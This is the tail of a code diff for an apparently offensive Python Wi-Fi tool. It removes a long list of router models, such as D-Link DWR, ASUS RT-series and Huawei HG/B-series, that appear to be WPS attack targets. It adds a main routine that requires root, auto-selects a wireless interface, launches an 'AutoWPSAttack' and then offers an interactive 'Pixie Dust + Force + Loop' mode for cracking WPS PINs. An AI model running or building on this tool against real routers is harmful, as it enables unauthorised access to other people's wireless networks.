-DWR-714 D1
-DWR-714 E1
-DWR-715
-DWR-715 A1
-DWR-715 B1
-DWR-715 C1
-DWR-715 D1
-DWR-715 E1
-DWR-716
-DWR-716 A1
-DWR-716 B1
-DWR-716 C1
-DWR-716 D1
-DWR-716 E1
-DWR-717
-DWR-717 A1
-DWR-717 B1
-DWR-717 C1
-DWR-717 D1
-DWR-717 E1
-DWR-718
-DWR-718 A1
-DWR-718 B1
-DWR-718 C1
-DWR-718 D1
-DWR-718 E1
-DWR-719
-DWR-719 A1
-DWR-719 B1
-DWR-719 C1
-DWR-719 D1
-DWR-719 E1
-DWR-720
-DWR-720 A1
-DWR-720 B1
-DWR-720 C1
-DWR-720 D1
-DWR-720 E1
-DWR-721
-DWR-721 A1
-DWR-721 B1
-DWR-721 C1
-DWR-721 D1
-DWR-721 E1
-DWR-722
-DWR-722 A1
-DWR-722 B1
-DWR-722 C1
-DWR-722 D1
-DWR-722 E1
-DWR-723
-DWR-723 A1
-DWR-723 B1
-DWR-723 C1
-DWR-723 D1
-DWR-723 E1
-DWR-724
-DWR-724 A1
-DWR-724 B1
-DWR-724 C1
-DWR-724 D1
-DWR-724 E1
-DWR-725
-DWR-725 A1
-DWR-725 B1
-DWR-725 C1
-DWR-725 D1
-DWR-725 E1
-DWR-726
-DWR-726 A1
-DWR-726 B1
-DWR-726 C1
-DWR-726 D1
-DWR-726 E1
-DWR-727
-DWR-727 A1
-DWR-727 B1
-DWR-727 C1
-DWR-727 D1
-DWR-727 E1
-DWR-728
-DWR-728 A1
-DWR-728 B1
-DWR-728 C1
-DWR-728 D1
-DWR-728 E1
-DWR-729
-DWR-729 A1
-DWR-729 B1
-DWR-729 C1
-DWR-729 D1
-DWR-729 E1
-DWR-730
-DWR-730 A1
-DWR-730 B1
-DWR-730 C1
-DWR-730 D1
-DWR-730 E1
-DWR-731
-DWR-731 A1
-DWR-731 B1
-DWR-731 C1
-DWR-731 D1
-DWR-731 E1
-DWR-732
-DWR-732 A1
-DWR-732 B1
-DWR-732 C1
-DWR-732 D1
-DWR-732 E1
-DWR-733
-DWR-733 A1
-DWR-733 B1
-DWR-733 C1
-DWR-733 D1
-DWR-733 E1
-DWR-734
-DWR-734 A1
-DWR-734 B1
-DWR-734 C1
-DWR-734 D1
-DWR-734 E1
-DWR-735
-DWR-735 A1
-DWR-735 B1
-DWR-735 C1
-DWR-735 D1
-DWR-735 E1
-DWR-736
-DWR-736 A1
-DWR-736 B1
-DWR-736 C1
-DWR-736 D1
-DWR-736 E1
-DWR-737
-DWR-737 A1
-DWR-737 B1
-DWR-737 C1
-DWR-737 D1
-DWR-737 E1
-DWR-738
-DWR-738 A1
-DWR-738 B1
-DWR-738 C1
-DWR-738 D1
-DWR-738 E1
-DWR-739
-DWR-739 A1
-DWR-739 B1
-DWR-739 C1
-DWR-739 D1
-DWR-739 E1
-DWR-740
-DWR-740 A1
-DWR-740 B1
-DWR-740 C1
-DWR-740 D1
-DWR-740 E1
-DWR-741
-DWR-741 A1
-DWR-741 B1
-DWR-741 C1
-DWR-741 D1
-DWR-741 E1
-DWR-742
-DWR-742 A1
-DWR-742 B1
-DWR-742 C1
-DWR-742 D1
-DWR-742 E1
-DWR-743
-DWR-743 A1
-DWR-743 B1
-DWR-743 C1
-DWR-743 D1
-DWR-743 E1
-DWR-744
-DWR-744 A1
-DWR-744 B1
-DWR-744 C1
-DWR-744 D1
-DWR-744 E1
-DWR-745
-DWR-745 A1
-DWR-745 B1
-DWR-745 C1
-DWR-745 D1
-DWR-745 E1
-DWR-746
-DWR-746 A1
-DWR-746 B1
-DWR-746 C1
-DWR-746 D1
-DWR-746 E1
-DWR-747
-DWR-747 A1
-DWR-747 B1
-DWR-747 C1
-DWR-747 D1
-DWR-747 E1
-DWR-748
-DWR-748 A1
-DWR-748 B1
-DWR-748 C1
-DWR-748 D1
-DWR-748 E1
-DWR-749
-DWR-749 A1
-DWR-749 B1
-DWR-749 C1
-DWR-749 D1
-DWR-749 E1
-DWR-750
-DWR-750 A1
-DWR-750 B1
-DWR-750 C1
-DWR-750 D1
-DWR-750 E1
-DWR-751
-DWR-751 A1
-DWR-751 B1
-DWR-751 C1
-DWR-751 D1
-DWR-751 E1
-DWR-752
-DWR-752 A1
-DWR-752 B1
-DWR-752 C1
-DWR-752 D1
-DWR-752 E1
-DWR-753
-DWR-753 A1
-DWR-753 B1
-DWR-753 C1
-DWR-753 D1
-DWR-753 E1
-DWR-754
-DWR-754 A1
-DWR-754 B1
-DWR-754 C1
-DWR-754 D1
-DWR-754 E1
-DWR-755
-DWR-755 A1
-DWR-755 B1
-DWR-755 C1
-DWR-755 D1
-DWR-755 E1
-DWR-756
-DWR-756 A1
-DWR-756 B1
-DWR-756 C1
-DWR-756 D1
-DWR-756 E1
-DWR-757
-DWR-757 A1
-DWR-757 B1
-DWR-757 C1
-DWR-757 D1
-DWR-757 E1
-DWR-758
-DWR-758 A1
-DWR-758 B1
-DWR-758 C1
-DWR-758 D1
-DWR-758 E1
-DWR-759
-DWR-759 A1
-DWR-759 B1
-DWR-759 C1
-DWR-759 D1
-DWR-759 E1
-DWR-760
-DWR-760 A1
-DWR-760 B1
-DWR-760 C1
-DWR-760 D1
-DWR-760 E1
-DWR-761
-DWR-761 A1
-DWR-761 B1
-DWR-761 C1
-DWR-761 D1
-DWR-761 E1
-DWR-762
-DWR-762 A1
-DWR-762 B1
-DWR-762 C1
-DWR-762 D1
-DWR-762 E1
-DWR-763
-DWR-763 A1
-DWR-763 B1
-DWR-763 C1
-DWR-763 D1
-DWR-763 E1
-DWR-764
-DWR-764 A1
-DWR-764 B1
-DWR-764 C1
-DWR-764 D1
-DWR-764 E1
-DWR-765
-DWR-765 A1
-DWR-765 B1
-DWR-765 C1
-DWR-765 D1
-DWR-765 E1
-DWR-766
-DWR-766 A1
-DWR-766 B1
-DWR-766 C1
-DWR-766 D1
-DWR-766 E1
-DWR-767
-DWR-767 A1
-DWR-767 B1
-DWR-767 C1
-DWR-767 D1
-DWR-767 E1
-DWR-768
-DWR-768 A1
-DWR-768 B1
-DWR-768 C1
-DWR-768 D1
-DWR-768 E1
-DWR-769
-DWR-769 A1
-DWR-769 B1
-DWR-769 C1
-DWR-769 D1
-DWR-769 E1
-DWR-770
-DWR-770 A1
-DWR-770 B1
-DWR-770 C1
-DWR-770 D1
-DWR-770 E1
-DWR-771
-DWR-771 A1
-DWR-771 B1
-DWR-771 C1
-DWR-771 D1
-DWR-771 E1
-DWR-772
-DWR-772 A1
-DWR-772 B1
-DWR-772 C1
-DWR-772 D1
-DWR-772 E1
-DWR-773
-DWR-773 A1
-DWR-773 B1
-DWR-773 C1
-DWR-773 D1
-DWR-773 E1
-DWR-774
-DWR-774 A1
-DWR-774 B1
-DWR-774 C1
-DWR-774 D1
-DWR-774 E1
-DWR-775
-DWR-775 A1
-DWR-775 B1
-DWR-775 C1
-DWR-775 D1
-DWR-775 E1
-DWR-776DWR-776 A1
-DWR-776 B1
-DWR-776 C1
-DWR-776 D1
-DWR-776 E1
-DWR-777
-DWR-777 A1
-DWR-777 B1
-DWR-777 C1
-DWR-777 D1
-DWR-777 E1
-DWR-778
-DWR-778 A1
-DWR-778 B1
-DWR-778 C1
-DWR-778 D1
-DWR-778 E1
-DWR-779
-DWR-779 A1
-DWR-779 B1
-DWR-779 C1
-DWR-779 D1
-DWR-779 E1
-DWR-780
-DWR-780 A1
-DWR-780 B1
-DWR-780 C1
-DWR-780 D1
-DWR-780 E1
-DWR-781
-DWR-781 A1
-DWR-781 B1
-DWR-781 C1
-DWR-781 D1
-DWR-781 E1
-DWR-782
-DWR-782 A1
-DWR-782 B1
-DWR-782 C1
-DWR-782 D1
-DWR-782 E1
-DWR-783
-DWR-783 A1
-DWR-783 B1
-DWR-783 C1
-DWR-783 D1
-DWR-783 E1
-DWR-784
-DWR-784 A1
-DWR-784 B1
-DWR-784 C1
-DWR-784 D1
-DWR-784 E1
-DWR-785
-DWR-785 A1
-DWR-785 B1
-DWR-785 C1
-DWR-785 D1
-DWR-785 E1
-DWR-786
-DWR-786 A1
-DWR-786 B1
-DWR-786 C1
-DWR-786 D1
-DWR-786 E1
-DWR-787
-DWR-787 A1
-DWR-787 B1
-DWR-787 C1
-DWR-787 D1
-DWR-787 E1
-DWR-788
-DWR-788 A1
-DWR-788 B1
-DWR-788 C1
-DWR-788 D1
-DWR-788 E1
-DWR-789
-DWR-789 A1
-DWR-789 B1
-DWR-789 C1
-DWR-789 D1
-DWR-789 E1
-DWR-790
-DWR-790 A1
-DWR-790 B1
-DWR-790 C1
-DWR-790 D1
-DWR-790 E1
-DWR-791
-DWR-791 A1
-DWR-791 B1
-DWR-791 C1
-DWR-791 D1
-DWR-791 E1
-DWR-792
-DWR-792 A1
-DWR-792 B1
-DWR-792 C1
-DWR-792 D1
-DWR-792 E1
-DWR-793
-DWR-793 A1
-DWR-793 B1
-DWR-793 C1
-DWR-793 D1
-DWR-793 E1
-DWR-794
-DWR-794 A1
-DWR-794 B1
-DWR-794 C1
-DWR-794 D1
-DWR-794 E1
-DWR-795
-DWR-795 A1
-DWR-795 B1
-DWR-795 C1
-DWR-795 D1
-DWR-795 E1
-DWR-796
-DWR-796 A1
-DWR-796 B1
-DWR-796 C1
-DWR-796 D1
-DWR-796 E1
-DWR-797
-DWR-797 A1
-DWR-797 B1
-DWR-797 C1
-DWR-797 D1
-DWR-797 E1
-DWR-798
-DWR-798 A1
-DWR-798 B1
-DWR-798 C1
-DWR-798 D1
-DWR-798 E1
-DWR-799
-DWR-799 A1
-DWR-799 B1
-DWR-799 C1
-DWR-799 D1
-DWR-799 E1
-DWR-800
-DWR-800 A1
-DWR-800 B1
-DWR-800 C1
-DWR-800 D1
-DWR-800 E1
-RT-AC51U
-RT-AC51U A1
-RT-AC51U B1
-RT-AC51U C1
-RT-AC51U D1
-RT-AC51U E1
-RT-AC52U
-RT-AC52U A1
-RT-AC52U B1
-RT-AC52U C1
-RT-AC52U D1
-RT-AC52U E1
-RT-AC52U_B1
-RT-AC53
-RT-AC53 A1
-RT-AC53 B1
-RT-AC53 C1
-RT-AC53 D1
-RT-AC53 E1
-RT-AC57U
-RT-AC57U A1
-RT-AC57U B1
-RT-AC57U C1
-RT-AC57U D1
-RT-AC57U E1
-RT-AC65P
-RT-AC65P A1
-RT-AC65P B1
-RT-AC65P C1
-RT-AC65P D1
-RT-AC65P E1
-RT-AC85P
-RT-AC85P A1
-RT-AC85P B1
-RT-AC85P C1
-RT-AC85P D1
-RT-AC85P E1
-RT-AC1200
-RT-AC1200 A1
-RT-AC1200 B1
-RT-AC1200 C1
-RT-AC1200 D1
-RT-AC1200 E1
-RT-AC1200G+
-RT-AC1200G+ A1
-RT-AC1200G+ B1
-RT-AC1200G+ C1
-RT-AC1200G+ D1
-RT-AC1200G+ E1
-RT-AC1200_V2
-RT-AC1200_V2 A1
-RT-AC1200_V2 B1
-RT-AC1200_V2 C1
-RT-AC1200_V2 D1
-RT-AC1200_V2 E1
-RT-AC1750
-RT-AC1750 A1
-RT-AC1750 B1
-RT-AC1750 C1
-RT-AC1750 D1
-RT-AC1750 E1
-RT-AC1750U
-RT-AC1750U A1
-RT-AC1750U B1
-RT-AC1750U C1
-RT-AC1750U D1
-RT-AC1750U E1
-RT-AC750
-RT-AC750 A1
-RT-AC750 B1
-RT-AC750 C1
-RT-AC750 D1
-RT-AC750 E1
-RT-AC750L
-RT-AC750L A1
-RT-AC750L B1
-RT-AC750L C1
-RT-AC750L D1
-RT-AC750L E1
-RT-AC51
-RT-AC51 A1
-RT-AC51 B1
-RT-AC51 C1
-RT-AC51 D1
-RT-AC51 E1
-RT-AX55
-RT-AX55 A1
-RT-AX55 B1
-RT-AX55 C1
-RT-AX55 D1
-RT-AX55 E1
-RT-AX55 A2
-RT-AX55 B2
-RT-AX55 C2
-RT-AX55 D2
-RT-AX55 E2
-RT-AX59U
-RT-AX59U A1
-RT-AX59U B1
-RT-AX59U C1
-RT-AX59U D1
-RT-AX59U E1
-RT-AX92U
-RT-AX92U A1
-RT-AX92U B1
-RT-AX92U C1
-RT-AX92U D1
-RT-AX92U E1
-GT-AX11000
-GT-AX11000 A1
-GT-AX11000 B1
-GT-AX11000 C1
-GT-AX11000 D1
-GT-AX11000 E1
-GT-BE98
-GT-BE98 A1
-GT-BE98 B1
-GT-BE98 C1
-GT-BE98 D1
-GT-BE98 E1
-GT-BE98 Pro
-GT-BE98 Pro A1
-GT-BE98 Pro B1
-GT-BE98 Pro C1
-GT-BE98 Pro D1
-GT-BE98 Pro E1
-RT-N10U
-RT-N10U A1
-RT-N10U B1
-RT-N10U C1
-RT-N10U D1
-RT-N10U E1
-RT-N12
-RT-N12 A1
-RT-N12 B1
-RT-N12 C1
-RT-N12 D1
-RT-N12 E1
-RT-N12D1
-RT-N12D1 A1
-RT-N12D1 B1
-RT-N12D1 C1
-RT-N12D1 D1
-RT-N12D1 E1
-RT-N12VP
-RT-N12VP A1
-RT-N12VP B1
-RT-N12VP C1
-RT-N12VP D1
-RT-N12VP E1
-RT-N12E
-RT-N12E A1
-RT-N12E B1
-RT-N12E C1
-RT-N12E D1
-RT-N12E E1
-RT-N12E_B1
-RT-N12E_B1 A1
-RT-N12E_B1 B1
-RT-N12E_B1 C1
-RT-N12E_B1 D1
-RT-N12E_B1 E1
-RT-N12LX
-RT-N12LX A1
-RT-N12LX B1
-RT-N12LX C1
-RT-N12LX D1
-RT-N12LX E1
-RT-N14U
-RT-N14U A1
-RT-N14U B1
-RT-N14U C1
-RT-N14U D1
-RT-N14U E1
-RT-N56U
-RT-N56U A1
-RT-N56U B1
-RT-N56U C1
-RT-N56U D1
-RT-N56U E1
-RT-N56UB1
-RT-N56UB1 A1
-RT-N56UB1 B1
-RT-N56UB1 C1
-RT-N56UB1 D1
-RT-N56UB1 E1
-RT-N65U
-RT-N65U A1
-RT-N65U B1
-RT-N65U C1
-RT-N65U D1
-RT-N65U E1
-RT-N300
-RT-N300 A1
-RT-N300 B1
-RT-N300 C1
-RT-N300 D1
-RT-N300 E1
-RT-N11P
-RT-N11P A1
-RT-N11P B1
-RT-N11P C1
-RT-N11P D1
-RT-N11P E1
-HG532d
-HG532d A1
-HG532d B1
-HG532d C1
-HG532d D1
-HG532d E1
-HG532e
-HG532e A1
-HG532e B1
-HG532e C1
-HG532e D1
-HG532e E1
-HG532f
-HG532f A1
-HG532f B1
-HG532f C1
-HG532f D1
-HG532f E1
-HG532n
-HG532n A1
-HG532n B1
-HG532n C1
-HG532n D1
-HG532n E1
-HG532s
-HG532s A1
-HG532s B1
-HG532s C1
-HG532s D1
-HG532s E1
-HG532v
-HG532v A1
-HG532v B1
-HG532v C1
-HG532v D1
-HG532v E1
-HG8245H
-HG8245H A1
-HG8245H B1
-HG8245H C1
-HG8245H D1
-HG8245H E1
-HG8247H
-HG8247H A1
-HG8247H B1
-HG8247H C1
-HG8247H D1
-HG8247H E1
-HG8546M
-HG8546M A1
-HG8546M B1
-HG8546M C1
-HG8546M D1
-HG8546M E1
-HG8547M
-HG8547M A1
-HG8547M B1
-HG8547M C1
-HG8547M D1
-HG8547M E1
-EG8145V5
-EG8145V5 A1
-EG8145V5 B1
-EG8145V5 C1
-EG8145V5 D1
-EG8145V5 E1
-HG8045A
-HG8045A A1
-HG8045A B1
-HG8045A C1
-HG8045A D1
-HG8045A E1
-HG8545M
-HG8545M A1
-HG8545M B1
-HG8545M C1
-HG8545M D1
-HG8545M E1
-HG8546A5
-HG8546A5 A1
-HG8546A5 B1
-HG8546A5 C1
-HG8546A5 D1
-HG8546A5 E1
-HG8547A5
-HG8547A5 A1
-HG8547A5 B1
-HG8547A5 C1
-HG8547A5 D1
-HG8547A5 E1
-B310s-927
-B310s-927 A1
-B310s-927 B1
-B310s-927 C1
-B310s-927 D1
-B310s-927 E1
-B315s-936
-B315s-936 A1
-B315s-936 B1
-B315s-936 C1
-B315s-936 D1
-B315s-936 E1
-B525s-65a
-B525s-65a A1
-B525s-65a B1
-B525s-65a C1
-B525s-65a D1
-B525s-65a E1
-B535-932
-B535-932 A1
-B535-932 B1
-B535-932 C1
-B535-932 D1
-B535-932 E1
-B618s-22d
-B618s-22d A1
-B618s-22d B1
-B618s-22d C1
-B618s-22d D1
-B618s-22d E1
-"""
+if __name__ == '__main__':
+    if os.getuid() != 0:
+        die("Run it as root")
+    
+    # Auto-detect interface
+    interface = get_wireless_interface()
+    if not interface:
+        die("No wireless interface found! Please check your connection.")
+    
+    if not ifaceUp(interface):
+        die(f'Unable to up interface "{interface}"')
+    
+    print("\033[?25l")
+    
+    try:
+        # Phase 1: Auto-attack mode
+        attack = AutoWPSAttack(interface, save_result=False)
+        attack.run()
+        
+        # Wait for ENTER to go to interactive mode
+        print("\n" + "="*60)
+        print("  AUTO-ATTACK COMPLETE ".center(60))
+        print("  Press ENTER to enter interactive mode ".center(60))
+        print("  (Pixie Dust + Force + Loop) ".center(60))
+        print("="*60)
+        
+        input()  # Wait for ENTER
+        
+        # Phase 2: Interactive mode
+        enter_interactive_mode(interface, save_result=False)
+        
+    except KeyboardInterrupt:
+        print("\n\n[!] Aborted by user")
+    finally:
+        print("\033[?25h")
+        print("\nExiting...")
